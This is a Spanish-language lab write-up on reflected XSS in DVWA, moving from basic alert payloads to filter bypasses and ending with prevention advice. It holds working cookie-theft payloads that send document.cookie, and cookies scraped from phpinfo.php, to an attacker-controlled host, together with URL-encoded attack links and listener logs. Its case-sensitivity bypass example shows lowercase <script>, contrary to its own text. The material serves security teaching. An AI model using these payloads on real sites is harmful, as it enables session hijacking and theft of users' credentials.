# Reflected XSS — Cross-Site Scripting

## Índice

- [Reflected XSS — Cross-Site Scripting](#reflected-xss--cross-site-scripting)
  - [Índice](#índice)
  - [1. Cross-Site Scripting (XSS)](#1-cross-site-scripting-xss)
    - [Tipos de ataques XSS](#tipos-de-ataques-xss)
  - [2. Reflected XSS](#2-reflected-xss)
    - [Metodología de detección](#metodología-de-detección)
  - [3. Reflected XSS en acción](#3-reflected-xss-en-acción)
    - [Nivel de seguridad Low](#nivel-de-seguridad-low)
      - [Robo de cookies](#robo-de-cookies)
      - [HttpOnly](#httponly)
    - [Nivel de seguridad Medium](#nivel-de-seguridad-medium)
    - [Nivel de seguridad High](#nivel-de-seguridad-high)
  - [4. Revisión del código fuente](#4-revisión-del-código-fuente)
    - [Nivel Low — sin ninguna protección](#nivel-low--sin-ninguna-protección)
    - [Nivel Medium — filtro `str_replace()` insuficiente](#nivel-medium--filtro-str_replace-insuficiente)
    - [Nivel High — filtro `preg_replace()` con regex](#nivel-high--filtro-preg_replace-con-regex)
  - [5. Prevención](#5-prevención)

---

## 1. Cross-Site Scripting (XSS)

XSS es una vulnerabilidad en la que se inyectan _scripts_ maliciosos en sitios web, que de otro modo serían confiables, de forma que el **navegador web de la víctima los ejecuta**. En un ataque XSS habitualmente el código inyectado es Javascript (aunque puede ser otro código que el navegador pueda ejecutar) y ocurre en aquellos puntos donde la aplicación web recibe información del usuario, que utiliza en la salida que genera, **sin validarla ni codificarla**.

A diferencia de otras vulnerabilidades como SQLi, XSS no ataca directamente al servidor sino al **cliente (navegador)**, aprovechando la confianza que el navegador deposita en el contenido servido desde un dominio de confianza.

### Tipos de ataques XSS

- **Reflejado** (_Reflected XSS_): el código malicioso se envía en la respuesta HTTP inmediata a la petición realizada por el usuario. Requiere que la víctima haga clic en una URL especialmente preparada por el atacante. Es el tipo más común y el más sencillo de explotar.

- **Almacenado** (_Stored XSS_): el código malicioso está almacenado en la aplicación (base de datos, comentarios, perfiles de usuario, etc.) y se sirve a los clientes cuando acceden a la página vulnerable. Es especialmente peligroso ya que no requiere interacción directa con la URL maliciosa: cualquier usuario que visite la página infectada será víctima del ataque.

- **Basados en DOM** (_DOM-based XSS_): la vulnerabilidad existe en el **lado del cliente** y la ejecución del código malicioso sucede en el navegador sin que haya nuevas peticiones al servidor, manipulándose directamente el DOM (_Document Object Model_). Dificulta la detección ya que el payload nunca llega al servidor.

---

## 2. Reflected XSS

_Reflected XSS_ ocurre cuando la entrada de datos proporcionada por el usuario en una petición HTTP se incluye en la respuesta HTTP inmediata **sin una validación adecuada**.

Ejemplo de código PHP vulnerable:

```php
<?php
// Vulnerable code (No input validation or encoding)
if (isset($_GET['search'])) {
    $query = $_GET['search'];
    echo "Search results for: " . $query;
}
?>
```

En este caso, la URL `http://misitio.test/?search=martin` devuelve `Search results for: martin`. El problema es que al no comprobarse la entrada del usuario, un atacante podría introducir código Javascript que se ejecutaría en el navegador de la víctima:

```bash
http://misitio.test/search?=<script>código javascript</script>
```

Esto se transformaría en `Search results for: <script>código javascript</script>`, ejecutándose el código inyectado.

Entre las **consecuencias** de un ataque Reflected XSS están:

- Robo de información como contraseñas, cookies y tokens de sesión, que permitirán el secuestro de sesiones y la suplantación de la identidad de la víctima.
- Redirección a sitios maliciosos.
- Realización de acciones en la aplicación en nombre de la víctima.

El atacante puede proporcionar la URL maliciosa a la víctima a través de un enlace situado en un mensaje de correo electrónico, en un _tweet_, en una página de un sitio web que esté bajo su control o en una página de un sitio donde pueda crear contenido.

> **Recuerda:** La URL maliciosa va codificada en formato URL-encoding, por lo que `<script>` aparece como `%3Cscript%3E`. Esto dificulta la detección visual por parte de la víctima.

### Metodología de detección

La metodología recomendada por **Portswigger** para encontrar y comprobar vulnerabilidades XSS es:

1. Probar cada punto de entrada (parámetros y datos en la URL y/o cuerpo del mensaje).
2. Enviar valores alfanuméricos aleatorios para cada punto de entrada y analizar si aparecen reflejados en la respuesta.
3. Analizar el **contexto de reflexión**: entre dos etiquetas HTML, dentro de un atributo, dentro de código Javascript, etc. El contexto determina el _payload_ a usar.
4. Probar un _payload_ candidato adecuado al contexto.
5. Probar _payloads_ alternativos en caso de fallo (bloqueos, filtros, modificaciones hechas por la aplicación, etc.).

> **Importante:** El contexto de inyección es clave. Un payload válido en una reflexión entre etiquetas HTML puede no funcionar si la reflexión se produce dentro de un atributo o dentro de un bloque Javascript. Hay que adaptar el payload al contexto en cada caso.

---

## 3. Reflected XSS en acción

El objetivo es aprovecharse de la vulnerabilidad XSS reflejado para **robar la cookie del usuario admin** y acceder a la aplicación suplantando su identidad. El laboratorio empleado es **DVWA** (_Damn Vulnerable Web Application_).

---

### Nivel de seguridad Low

Tras configurar el nivel de seguridad en DVWA a `low`, se accede a la sección de _XSS Reflected_ donde aparece un formulario que permite introducir un nombre. Al enviarlo, se genera una petición GET al servidor:

```bash
GET /dvwa/vulnerabilities/xss_r/?name=martin HTTP/1.1
Host: 192.168.100.4
Cookie: security=low; PHPSESSID=47d8i4038pchcqr2a9lnv6c7lr
```

El valor del parámetro `name` aparece reflejado directamente en la página de respuesta dentro de las etiquetas `<pre>`:

```html
<pre>Hello martin</pre>
```

**Paso 1 — Confirmar inyección HTML:**

Se inyecta código HTML como `<h1>Martín</h1>` para confirmar que se refleja sin filtrar. Revisando el código fuente de la respuesta:

```html
<pre><h1>Martín</h1></pre>
```

![Introducir nombre en XSS](./imagenes/reflected%20xss/01.png)

![Resultado nombre en XSS](./imagenes/reflected%20xss/02.png)

Se confirma que la inyección se produce entre las etiquetas `<pre>...</pre>`. El contexto es HTML puro, por lo que el payload básico con etiquetas `<script>` es directamente aplicable.

**Paso 2 — Confirmar ejecución de Javascript:**

Se inyecta el payload:

```html
<script>
  alert("XSS detectado");
</script>
```

Que produce en el HTML de la respuesta:

```html
<pre>Hello <script>alert('XSS detectado')</script></pre>
```

![XSS HTML](./imagenes/reflected%20xss/03.png)

![XSS JS](./imagenes/reflected%20xss/04.png)

El código Javascript se ejecuta y aparece la ventana emergente con `XSS detectado`, confirmando la vulnerabilidad. La URL resultante es:

```bash
/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS+detectado%27%29%3C%2Fscript%3E#
```

> **Nota:** El payload `alert()` es el más usado para probar vulnerabilidades XSS, pero en navegadores Chrome versión 92 y posteriores se aplican restricciones al método `alert()`. Como alternativa se puede emplear `print()`. En [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) y en la [XSS cheat sheet de PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) hay una amplia colección de payloads XSS.

---

#### Robo de cookies

El flujo de un ataque real de robo de cookies mediante Reflected XSS es el siguiente:

1. El atacante crea una URL donde inyecta un _payload_ malicioso para robar las cookies de la víctima.
2. El atacante envía la URL maliciosa a la víctima en un email o la pone disponible en un sitio web que controla.
3. La víctima accede a la URL maliciosa, el _payload_ se ejecuta en su navegador y las cookies se envían al servidor del atacante.
4. El atacante usa la cookie robada para suplantar la identidad de la víctima.

**Paso 1 — Preparación del payload y servidor:**

Se pone un servidor a la escucha para recoger la cookie. Se puede usar `ncat` o Python:

```bash
┌──(kali㉿kali)-[~]
└─$ ncat -lnvp 80
...
```

El **payload malicioso** es:

```html
<script>
  document.location = "http://192.168.100.250/?cookie=" + document.cookie;
</script>
```

| Parte del payload         | Función                                                                            |
| ------------------------- | ---------------------------------------------------------------------------------- |
| `http://192.168.100.250/` | Servidor web bajo control del atacante                                             |
| `?cookie=`                | Parámetro que recoge las cookies de la víctima                                     |
| `document.cookie`         | Función Javascript que lee las cookies de la víctima asociadas a la web vulnerable |

Si nosotros caputamos y vemos la petición con Burp Suite veremos lo siguiente:

```bash
GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3E+++document.location+%3D+%22http%3A%2F%2F192.168.100.250%2F%3Fcookie%3D%22+%2B+document.cookie%3B+%3C%2Fscript%3E HTTP/1.1
Host: 192.168.100.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://192.168.100.4/dvwa/vulnerabilities/xss_r/
Cookie: security=low; PHPSESSID=0q5nebn9sr5bbifebj5uop4v6b
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

**Paso 2 — Enviar la URL maliciosa a la víctima:**

La URL codificada en URL-encoding es la siguiente y sería la que por ejemplo se enviaría por correo a la víctima:

```
http://192.168.100.4/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3E+++document.location+%3D+%22http%3A%2F%2F192.168.100.250%2F%3Fcookie%3D%22+%2B+document.cookie%3B+%3C%2Fscript%3E
```

**Paso 3 — La víctima visita la URL maliciosa.**

Una vez que el usuario accede a la URL se envían los datos al equipo atacante y con los datos de las cookies podemos suplantar la identidad de la víctima.

**Paso 4 — Recepción de las cookies en el servidor del atacante:**

```bash
ncat -lnvp 80
Ncat: Version 7.99 ( https://nmap.org/ncat )
Ncat: Listening on [::]:80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 192.168.100.250:47306.
GET /?cookie=security=low;%20PHPSESSID=0q5nebn9sr5bbifebj5uop4v6b HTTP/1.1
Host: 192.168.100.250
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://192.168.100.4/
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Cookie capturada: `PHPSESSID=0q5nebn9sr5bbifebj5uop4v6b`

**Paso 5 — Suplantación de identidad:**

Se abre un nuevo navegador (o una ventana de incógnito), se accede a `http://192.168.100.4/dvwa/` y con las herramientas de programador (`F12 → Storage → Cookies`) se sustituye el valor de `PHPSESSID` por el capturado. Al recargar la página se accede a la aplicación **sin necesidad de introducir usuario ni contraseña**.

![PHPSESSID suplantada](./imagenes/reflected%20xss/05.png)

> **Advertencia:** Este ataque funciona porque la cookie `PHPSESSID` no tiene la flag `HttpOnly` activada, permitiendo que Javascript la lea mediante `document.cookie`. Si `HttpOnly` estuviese activada, este payload no funcionaría directamente.

---

#### HttpOnly

`HttpOnly` es una _flag_ que se puede incluir en la cabecera HTTP de respuesta `Set-Cookie` y que sirve para indicar que esa cookie **no es accesible por Javascript**, mitigando el riesgo a ataques XSS destinados a robar cookies.

```bash
Set-Cookie: PHPSESSID=0q5nebn9sr5bbifebj5uop4v6b; expires=...; path=/; HttpOnly; SameSite=1
```

Si el navegador soporta `HttpOnly`, aunque exista una vulnerabilidad XSS y el usuario accidentalmente acceda al enlace malicioso, el navegador **no revelará la cookie** a Javascript.

Probando con `<script>alert(document.cookie)</script>` en una aplicación con `HttpOnly` activado, la ventana emergente solo muestra la cookie `security` (que no tiene `HttpOnly`) pero **no muestra la `PHPSESSID`**.

![alert de captura](./imagenes/reflected%20xss/06.png)

> **Nota:** Si se quiere hacer pruebas, se puede modificar el valor de la flag `HttpOnly` directamente en las herramientas del programador (`F12 → Storage → Cookies`).

---

### Nivel de seguridad Medium

En el nivel de seguridad `medium` el programador implementó algún sistema de validación de entrada: la inyección de código HTML funciona, pero el payload `<script>alert('XSS detectado')</script>` **no funciona**.

Analizando el código fuente de la página devuelta:

```html
<pre>Hello alert('XSS detectado')</script></pre>
```

El filtro elimina **únicamente** la etiqueta `<script>` de apertura, pero deja el `</script>` de cierre. Esto revela las debilidades del filtro. Además, una primera prueba es probar si es sensible a mayúsculas y minúsculas y podemos concluir que la etiqueta `<Script>` funciona.

**Técnicas para saltar el filtro:**

**1. Sensibilidad a mayúsculas/minúsculas** — `str_replace()` es _case-sensitive_:

```html
<script>
  alert("XSS detectado");
</script>
```

**2. Anidación de etiquetas** — al eliminar `<script>` interior queda un `<script>` válido:

| Antes del filtro                                  | Después del filtro                        |
| ------------------------------------------------- | ----------------------------------------- |
| `<script<script>>alert('XSS detectado')</script>` | `<script>alert('XSS detectado')</script>` |
| `<scr<script>ipt>alert('XSS detectado')</script>` | `<script>alert('XSS detectado')</script>` |

> **Recuerda:** Las técnicas de bypass basadas en anidación funcionan cuando el filtro hace un único paso de sustitución sin aplicar el filtro de forma recursiva. Si el filtro aplicase múltiples pasadas o expresiones regulares correctas, esta técnica no funcionaría.

---

### Nivel de seguridad High

En el nivel de seguridad `high` el programador mejoró el sistema de filtrado empleando la función `preg_replace()` con expresión regular insensible a mayúsculas/minúsculas. Los payloads anteriores ya no funcionan:

```bash
<script>alert('XSS detectado')</script>     --> Hello >
<Script>alert('XSS detectado')</Script>     --> Hello >
<script<script>>alert('XSS detectado')      --> Hello >
<scr<script>ipt>alert('XSS detectado')      --> Hello >
```

```php
<?php
header ("X-XSS-Protection: 0");
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}
?>
```

Todo el payload con etiquetas `script` es borrado salvo el `>` final, por lo que la expresión regular detecta apariciones de la palabra `script` (o sus versiones modificadas) y elimina toda la cadena.

**Técnica de bypass — etiqueta `<img>` con evento `onerror`:**

```html
<img src="x" onerror="alert('XSS detectado')" />
```

| Parte del payload        | Función                                                     |
| ------------------------ | ----------------------------------------------------------- |
| `<img src=x`             | Intenta insertar una imagen (inexistente) desde la ruta `x` |
| `onerror="..."`          | Evento que se dispara cuando falla la carga de la imagen    |
| `alert('XSS detectado')` | Código Javascript ejecutado al producirse el error          |

Este payload **no contiene la palabra `script`** por lo que esquiva completamente el filtro basado en expresión regular. El resultado es la ejecución del código Javascript sin necesidad de etiquetas `<script>`.

![XSS en código de error al cargar imagen](./imagenes/reflected%20xss/07.png)

> **Nota:** Existen muchos otros eventos HTML que pueden usarse para XSS sin etiquetas `<script>`: `onload`, `onmouseover`, `onfocus`, `onclick`, etc. La [XSS cheat sheet de PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) contiene cientos de combinaciones de etiquetas y eventos para diferentes contextos.

---

## 4. Revisión del código fuente

### Nivel Low — sin ninguna protección

```php
<?php
header("X-XSS-Protection: 0");

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}
?>
```

El valor de `$_GET['name']` se incorpora directamente a la salida HTML sin ningún tipo de validación ni codificación. Cualquier entrada del usuario modifica el HTML generado.

> **Nota:** La cabecera `X-XSS-Protection: 0` desactiva el filtro XSS integrado en los navegadores (presente en versiones antiguas de Chrome/IE). DVWA lo desactiva expresamente para que los ataques funcionen independientemente del navegador usado.

### Nivel Medium — filtro `str_replace()` insuficiente

```php
<?php
header("X-XSS-Protection: 0");

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
    echo "<pre>Hello {$name}</pre>";
}
?>
```

La función `str_replace()` presenta dos debilidades críticas:

- Es **sensible a mayúsculas/minúsculas**: `<Script>` no es detectada.
- **No aplica el filtro de forma recursiva**: la anidación de etiquetas (`<scr<script>ipt>`) permite saltarlo.

### Nivel High — filtro `preg_replace()` con regex

```php
<?php
header("X-XSS-Protection: 0");

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
    echo "<pre>Hello {$name}</pre>";
}
?>
```

La expresión regular `/i` hace la sustitución insensible a mayúsculas/minúsculas y detecta variantes con caracteres intercalados. Sin embargo, sigue siendo **insuficiente** porque:

- No cubre etiquetas alternativas como `<img>`, `<svg>`, `<iframe>`, etc.
- No cubre eventos HTML como `onerror`, `onload`, `onmouseover`, etc.
- Un enfoque basado en **lista negra** (_blacklist_) siempre es susceptible de ser saltado con nuevos vectores de ataque.

---

## 5. Prevención

El nivel de seguridad `impossible` de DVWA muestra las buenas prácticas. El código emplea `htmlspecialchars()` y tokens anti-CSRF:

```php
<?php
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Validación del token Anti-CSRF
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Codificación de la entrada
    $name = htmlspecialchars( $_GET[ 'name' ] );

    echo "<pre>Hello {$name}</pre>";
}

generateSessionToken();
?>
```

Con `htmlspecialchars()` los caracteres especiales se convierten en entidades HTML antes de insertarse en la página:

| Entrada del usuario                  | Salida codificada                                              |
| ------------------------------------ | -------------------------------------------------------------- |
| `<h2>martin</h2>`                    | `&lt;h2&gt;martin&lt;/h2&gt;`                                  |
| `<script>alert('XSS')</script>`      | `&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;`          |
| `<img src=x onerror="alert('XSS')">` | `&lt;img src=x onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;` |

El código HTML resultante se muestra como texto literal en la página sin ejecutarse, ya que el navegador interpreta `&lt;` como `<` visible pero no como inicio de una etiqueta HTML.

Las **medidas de prevención** recomendadas por Portswigger y OWASP son:

**Codificación de datos** (_Output encoding_)

Se debe aplicar la codificación antes de que se escriban en una página datos controlados por el usuario. En función del contexto será necesaria una codificación diferente:

- Contexto HTML: `<` → `&lt;`
- Contexto Javascript: `<` → `\u003c`
- Contexto atributo HTML: `"` → `&quot;`

En PHP las funciones `htmlentities()` o `htmlspecialchars()` realizan esta codificación para contextos HTML.

**Validación de entradas** (_Input validation_)

Además de la codificación se deben comprobar, de la forma más estricta posible, los datos introducidos por el usuario:

- Controlar que la entrada únicamente tiene el juego de caracteres esperado.
- Comprobar que el tipo de dato introducido se corresponde con el esperado.
- **Lo que no se corresponda con lo esperado debe descartarse**, en lugar de tratar de limpiar la entrada, ya que esto es más propenso a errores (ver el ejemplo de filtro del nivel `medium`).

> **Importante:** Es mejor emplear **listas blancas** (_whitelists_) en lugar de listas negras (_blacklists_), ya que así se garantiza que la aparición de un nuevo carácter o palabra no va a saltarse los controles. Un enfoque blacklist siempre puede ser evitado con nuevos vectores.

**CSP (Content Security Policy)**

CSP es una capa de seguridad adicional en los navegadores pensada principalmente para mitigar los ataques XSS. Permite indicar los dominios que el navegador puede considerar fiables para los _scripts_, de forma que únicamente se ejecutarían aquellos _scripts_ procedentes de ellos, ignorando el resto.

```http
Content-Security-Policy: script-src 'self' https://apis.example.com
```

> **Nota:** CSP no sustituye la validación y codificación correcta de la entrada/salida. Es una **capa adicional** de defensa que reduce el impacto de una vulnerabilidad XSS existente, pero no la elimina.

**Atributos de las cookies**

- `HttpOnly`: impide el acceso a cookies desde Javascript, mitigando el robo de cookies mediante XSS.
- `Secure`: la cookie solo se transmite sobre HTTPS.
- `SameSite`: controla cuándo se envían cookies en peticiones cross-site, mitigando ataques CSRF.

> **Recuerda:** Como se vio en la sección [Recuperar cookie con flag HttpOnly activada](#recuperar-cookie-con-flag-httponly-activada), `HttpOnly` **no es suficiente por sí sola** si la aplicación expone las cookies a través de otras páginas como `phpinfo.php`. La seguridad en profundidad requiere combinar múltiples capas de defensa y eliminar toda información innecesaria accesible públicamente ya que existen script como [PHP-info-cookie-stealer](https://github.com/HackCommander/PHP-info-cookie-stealer) para generar un ataque a través de esta información.

Este proceso se puede recrear de la siguiente manera. La presencia del archivo `phpinfo.php` y su sección de cookies permite el siguiente ataque:

1. **Crear un payload** que haga que el navegador acceda a la sección `HTTP_COOKIE` de la página `phpinfo.php`, extraiga la información de las cookies y las envíe a un servidor web malicioso controlado por el atacante.
2. **Preparar el servidor web** que recibirá las cookies robadas.
3. **Enviar la URL maliciosa** a la víctima.
4. **La víctima abrirá la URL** en su navegador y, al ejecutarse el payload, su navegador accederá a la sección `HTTP_COOKIE` de la página `phpinfo.php`, donde copiará la información de sus cookies y procederá a enviarla al servidor malicioso.
5. **El atacante**, con la cookie de sesión robada, procede a suplantar la identidad de la víctima.

![Vista de phpinfo](./imagenes/reflected%20xss/08.png)

Actualmente si hacemos un `<img src="x" onerror="alert(document.cookie)" />` para ver las cookies **no podremos** ver la de `PHPSESSID` ya que el flag `HttpOnly` nos lo impide.

![alert para ver cookies con HTTPOnly](./imagenes/reflected%20xss/09.png)

Para hacer la prueba de concepto del ataque clonamos el repositorio para el ataque.

```bash
┌──(kali㉿kali)-[~]
└─$ git clone https://github.com/HackCommander/PHP-info-cookie-stealer.git
Clonando en 'PHP-info-cookie-stealer'...
remote: Enumerating objects: 20, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (18/18), done.
Recibiendo objetos: 100% (20/20), 52.32 KiB | 491.00 KiB/s, listo.
Resolviendo deltas: 100% (7/7), listo.
remote: Total 20 (delta 7), reused 9 (delta 1), pack-reused 0 (from 0)
                                                                                   
┌──(kali㉿kali)-[~]
└─$ cat PHP-info-cookie-stealer/generate-javascript-payload.sh
#!/bin/bash

# Get the URL parameters
php_info_page_url=$1
attacker_web_server_url=$2

# Check if the URL parameters are provided
if [ -z "$php_info_page_url" ] || [ -z "$attacker_web_server_url" ]; then
  # Print an error message and exit if the URL parameters are not provided
  echo "Error: any of the URL parameters are not provided"
  echo "Usage: $0 <php_info_page_url> <attacker_web_server_url>"
  echo "Example: $0 http://vulnerable-server-to-xss.com/phpinfo.php http://attacker-web-server.com/"
  exit 1
fi

# Fill the JavaScript code template with the URL parameters
javascript_code="<script>fetch('$php_info_page_url').then(response=>response.text()).then(data=>{const startString='<tr><td class=\"e\">HTTP_COOKIE </td><td class=\"v\">';const endString='</td></tr>';const startIndex=data.indexOf(startString)+startString.length;const endIndex=data.indexOf(endString,startIndex);const cookies=data.substring(startIndex,endIndex);const encodedCookies=btoa(cookies);fetch('$attacker_web_server_url'+'?encodedCookies='+encodedCookies,{method:'GET'});});</script>"

# Output the JavaScript code
echo $javascript_code
```

Generamos el script a enviar a la víctima.

```bash
┌──(kali㉿kali)-[~]
└─$ PHP-info-cookie-stealer/generate-javascript-payload.sh http://192.168.100.4/dvwa/phpinfo.php http://192.168.100.250
<script>fetch('http://192.168.100.4/dvwa/phpinfo.php').then(response=>response.text()).then(data=>{const startString='<tr><td class="e">HTTP_COOKIE </td><td class="v">';const endString='</td></tr>';const startIndex=data.indexOf(startString)+startString.length;const endIndex=data.indexOf(endString,startIndex);const cookies=data.substring(startIndex,endIndex);const encodedCookies=btoa(cookies);fetch('http://192.168.100.250'+'?encodedCookies='+encodedCookies,{method:'GET'});});</script>
```

Una vez que vemos la información en nuestro servidor web podemos desencriptarla con `echo {encodedCookies} | base64 -d`.

```bash
┌──(kali㉿kali)-[~]
└─$ ncat -lnvp 80
Ncat: Version 7.99 ( https://nmap.org/ncat )
Ncat: Listening on [::]:80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 192.168.100.250:34764.
GET /?encodedCookies=UEhQU0VTU0lEPTNobWtxbTEyNGo3aDJmODVqazJ0dTZwYTljOyBzZWN1cml0eT1sb3cg HTTP/1.1
Host: 192.168.100.250
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.100.4/
Origin: http://192.168.100.4
Connection: keep-alive
Priority: u=4
```

```bash
┌──(kali㉿kali)-[~]
└─$  echo -n "UEhQU0VTU0lEPTNobWtxbTEyNGo3aDJmODVqazJ0dTZwYTljOyBzZWN1cml0eT1sb3cg" | base64 -d
PHPSESSID=3hmkqm124j7h2f85jk2tu6pa9c; security=low
```

Una vez probado el ataque en nuestra máquina podríamos enviar la URL para el ataque a la víctima. Teniendo en cuenta que la vulnerabilidad está en la sección `vulnerable_xss_low.php` de DVWA, el ataque podría ser enviado de la siguiente manera:

![URL](./imagenes/reflected%20xss/10.png)

```bash
http://192.168.100.4/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch(%27http%3A%2F%2F192.168.100.4%2Fdvwa%2Fphpinfo.php%27).then(response%3D%3Eresponse.text()).then(data%3D%3E{const+startString%3D%27%3Ctr%3E%3Ctd+class%3D%22e%22%3EHTTP_COOKIE+%3C%2Ftd%3E%3Ctd+class%3D%22v%22%3E%27%3Bconst+endString%3D%27%3C%2Ftd%3E%3C%2Ftr%3E%27%3Bconst+startIndex%3Ddata.indexOf(startString)%2BstartString.length%3Bconst+endIndex%3Ddata.indexOf(endString%2CstartIndex)%3Bconst+cookies%3Ddata.substring(startIndex%2CendIndex)%3Bconst+encodedCookies%3Dbtoa(cookies)%3Bfetch(%27http%3A%2F%2F192.168.100.250%27%2B%27%3FencodedCookies%3D%27%2BencodedCookies%2C{method%3A%27GET%27})%3B})%3B%3C%2Fscript%3E
```

Una vez cargada la URL por parte del usuario se obtiene la siguiente respuesta:

```bash
┌──(kali㉿kali)-[~]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.100.250 - - [21/May/2026 12:08:10] "GET /?encodedCookies=UEhQU0VTU0lEPTNobWtxbTEyNGo3aDJmODVqazJ0dTZwYTljOyBzZWN1cml0eT1sb3cg HTTP/1.1" 200 -
192.168.100.250 - - [21/May/2026 12:08:29] "GET /?encodedCookies=UEhQU0VTU0lEPTNobWtxbTEyNGo3aDJmODVqazJ0dTZwYTljOyBzZWN1cml0eT1sb3cg HTTP/1.1" 200 -
```

Si desencriptamos podemos ver los siguiente:

```bash
┌──(kali㉿kali)-[~]
└─$ echo "UEhQU0VTU0lEPTNobWtxbTEyNGo3aDJmODVqazJ0dTZwYTljOyBzZWN1cml0eT1sb3cg" | base64 -d
PHPSESSID=3hmkqm124j7h2f85jk2tu6pa9c; security=low
```

Podemos ver que el PHPSESSID coincide con el del usuario con la sesión abierta.

![PHPSESSID antes del ataque](./imagenes/reflected%20xss/11.png)